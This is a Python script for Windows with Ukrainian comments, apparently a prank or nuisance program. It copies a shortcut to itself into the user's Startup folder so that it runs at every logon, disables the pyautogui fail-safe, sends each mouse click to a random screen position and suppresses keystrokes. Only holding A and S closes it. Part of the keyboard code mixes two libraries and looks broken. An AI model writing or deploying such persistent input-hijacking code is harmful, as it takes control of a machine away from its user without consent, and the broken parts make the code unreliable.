import tkinter as tk
from pynput import keyboard
import sys
import os
import ctypes
import time
import threading
import random
import pyautogui
import mouse



#        c:\Users\vabim\Desktop\del %APPDATA%MicrosoftWindowsStart MenuProgramsStartuppersistent_script.lnk



# Функція для додавання скрипта в автозапуск
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    startup_script = os.path.join(startup_folder, "persistent_script.lnk")
    
    # Створення ярлика для автозапуску
    import winshell
    from win32com.client import Dispatch
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(startup_script)
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.Save()

# Функція для виходу з програми при натисканні A + S
def on_press(key):
    try:
        if key.char in ('a', 's'):
            pressed_keys.add(key.char)
            if 'a' in pressed_keys and 's' in pressed_keys:
                root.destroy()
                sys.exit()
    except AttributeError:
        pass

def on_release(key):
    try:
        if key.char in pressed_keys:
            pressed_keys.remove(key.char)
    except AttributeError:
        pass

def delayed_print(key_name):
    time.sleep(5)  # Затримка на 5 секунд
    print(f"Key pressed: {key_name}")

def keyboard_listener():
    while True:
        event = keyboard.read_event(suppress=True)  # Зчитуємо натиснуту клавішу
        if event.event_type == keyboard.KEY_DOWN:
            threading.Thread(target=delayed_print, args=(event.name,)).start()

def get_random_position():
    screen_width, screen_height = pyautogui.size()
    return random.randint(0, screen_width - 1), random.randint(0, screen_height - 1)

def on_click(event):
    if isinstance(event, mouse.ButtonEvent) and event.event_type == "down":  # Перевірка, чи це клік
        x, y = get_random_position()
        pyautogui.click(x, y, button=event.button)

# Вимкнення fail-safe (якщо потрібно)
pyautogui.FAILSAFE = False

# Перехоплення кліків миші
mouse.hook(on_click)

# Додаємо скрипт в автозапуск
add_to_startup()

# Створюємо головне вікно
root = tk.Tk()
root.title("Persistent Tkinter Window")
root.geometry("400x300")

# Список натиснутих клавіш
pressed_keys = set()

# Запускаємо слухач клавіатури
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Запускаємо слухач клавіатури в окремому потоці
threading.Thread(target=keyboard_listener, daemon=True).start()

# Запускаємо Tkinter
root.mainloop()